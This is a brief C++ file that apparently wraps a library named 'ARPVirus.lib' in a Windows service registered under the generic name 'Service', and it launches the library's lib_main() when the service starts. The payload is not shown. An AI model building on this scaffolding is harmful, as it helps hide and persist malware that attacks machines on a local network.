#include "StdAfx.h"
#include "ARPVirusService.h"

#pragma comment(lib, "ARPVirus.lib")
int lib_main();

CString CARPVirusService::m_szName = _T("Service");

CARPVirusService::CARPVirusService(void) : CService(m_szName)
{
}

CARPVirusService::~CARPVirusService(void)
{
}

DWORD CARPVirusService::serviceMain(int argc, TCHAR * argv[])
{
	lib_main();
	return 0;
}